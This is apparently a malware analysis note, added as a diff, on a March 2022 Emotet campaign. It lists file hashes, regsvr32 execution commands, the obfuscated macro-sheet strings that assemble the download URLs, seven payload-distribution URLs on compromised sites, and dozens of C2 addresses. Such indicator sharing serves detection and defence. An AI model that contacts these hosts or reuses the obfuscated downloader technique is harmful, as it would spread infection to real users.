@@ -1,0 +1,97 @@
+Emotet 2022 | epoch4 | 14.03.2022 | 
+
+************************************************************************************************************
+
+.xls 8818bb5f9820dd11479e7bf10591dbd7241c767654e17e70877f7daf6f295435
+.dll 0047e738f3fde9308fe845c33c79197dbb07d88da1d2960775f88109f96dc03e
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\2022-03-14_1453.xlsm
+
+C:\Windows\SysWow64\regsvr32.exe -s ..\rds.ocx
+
+C:\Windows\SysWOW64\regsvr32.exe /s C:\Windows\SysWOW64\Zcwtsndlb\antpgesee.sou
+
+************************************************************************************************************
+
+Hidden Macro Sheet - Obfuscation 
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="19" uniqueCount="19"><si><t>-</t></si><si><t>G</t></si><si><t>!</t></si><si><t>/</t></si><si><t>regsvr32.exe</t></si><si><t xml:space="preserve">&lt;0, </t></si><si><t>SysWow64\</t></si><si><t>\Windows\</t></si><si><t>",0,0)</t></si><si><t>,0,</t></si><si><t xml:space="preserve"> ..\rds.ocx</t></si><si><t>..\rds.ocx</t></si><si><t>"h"&amp;"tt"&amp;"ps://the"&amp;"sp"&amp;"arklezbo"&amp;"x.c"&amp;"o"&amp;"m/w"&amp;"p-a"&amp;"d"&amp;"mi"&amp;"n/kFk"&amp;"W"&amp;"N/","</t></si><si><t>"h"&amp;"ttp"&amp;"s://h"&amp;"erb"&amp;"tyt"&amp;"ox.c"&amp;"o"&amp;"m/w"&amp;"p-a"&amp;"dm"&amp;"in/d"&amp;"q/","</t></si><si><t>"h"&amp;"tt"&amp;"p://w"&amp;"ww.asy"&amp;"ad"&amp;"egir"&amp;"me"&amp;"n.c"&amp;"o"&amp;"m/Te"&amp;"mp"&amp;"la"&amp;"te/nEM"&amp;"RY55"&amp;"nQ"&amp;"gF/","</t></si><si><t>"h"&amp;"tt"&amp;"ps://we"&amp;"sttha"&amp;"me"&amp;"sp"&amp;"hy"&amp;"sio.c"&amp;"o"&amp;"m/bl"&amp;"og/D"&amp;"8A"&amp;"Ak"&amp;"Ey"&amp;"Z7"&amp;"u/","</t></si><si><t>"h"&amp;"ttp"&amp;"s://w"&amp;"w"&amp;"w.ad"&amp;"cre"&amp;"at"&amp;"or"&amp;"s.c"&amp;"o"&amp;"m.a"&amp;"u/adc"&amp;"re"&amp;"ators-e"&amp;"dm/RD"&amp;"k3Lt"&amp;"iwM"&amp;"kuDQy/","</t></si><si><t>"h"&amp;"ttp"&amp;"s://w"&amp;"w"&amp;"w.nip"&amp;"unp"&amp;"harm"&amp;"as"&amp;"kill.c"&amp;"o"&amp;"m/css/xm"&amp;"17D"&amp;"ssGXj"&amp;"Chc"&amp;"mm/","</t></si><si><t>"h"&amp;"tt"&amp;"ps://w"&amp;"w"&amp;"w.af"&amp;"yo"&amp;"nm"&amp;"aga"&amp;"zi"&amp;"n.c"&amp;"o"&amp;"m/w"&amp;"p-co"&amp;"nt"&amp;"en"&amp;"t/Dc"&amp;"nLR"&amp;"E/","</t></si></sst>      
+                      
+
+************************************************************************************************************
+
+.dll distro
+
+https://thesparklezbox.com/wp-admin/kFkWN/
+https://herbtytox.com/wp-admin/dq/
+http://www.asyadegirmen.com/Template/nEMRY55nQgF/
+https://westthamesphysio.com/blog/D8AAkEyZ7u/
+https://www.adcreators.com.au/adcreators-edm/RDk3LtiwMkuDQy/
+https://www.nipunpharmaskill.com/css/xm17DssGXjChcmm/
+https://www.afyonmagazin.com/wp-content/DcnLRE/
+
+Network
+
+https://217.182.143.248:8080/PUJMsBAPVmIsRLtiBlHHiQUdMZvkVUUkYLyYp
+
+c2's
+
+217.182.143.248:8080
+185.4.135.27:8080
+192.99.251.50:443
+146.59.226.45:443
+162.214.118.104:8080
+195.154.133.20:443
+103.75.201.2:443
+5.9.116.246:8080
+177.87.70.10:8080
+31.24.158.56:8080
+103.75.201.4:443
+158.69.222.101:443
+185.157.82.211:8080
+185.8.212.130:7080
+186.250.48.117:7080
+110.232.117.186:8080
+46.55.222.11:443
+196.218.30.83:443
+51.91.7.5:8080
+176.56.128.118:443
+207.38.84.195:8080
+173.212.193.249:8080
+45.118.135.203:7080
+164.68.99.3:8080
+209.126.98.206:8080
+212.24.98.99:8080
+151.106.112.196:8080
+45.176.232.124:443
+153.126.146.25:7080
+212.237.17.99:8080
+45.142.114.231:8080
+107.182.225.142:8080
+45.118.115.99:8080
+79.172.212.216:8080
+50.30.40.196:8080
+82.165.152.127:8080
+50.116.54.215:443
+1.234.2.232:8080
+58.227.42.236:80
+216.158.226.206:443
+159.8.59.82:8080
+129.232.188.93:443
+189.126.111.200:7080
+138.185.72.26:8080
+159.65.88.10:8080
+103.221.221.247:8080
+188.44.20.25:443
+203.114.109.124:443
+197.242.150.244:8080
+51.254.140.238:7080
+176.104.106.96:8080
+178.79.147.66:8080
+131.100.24.231:80
+
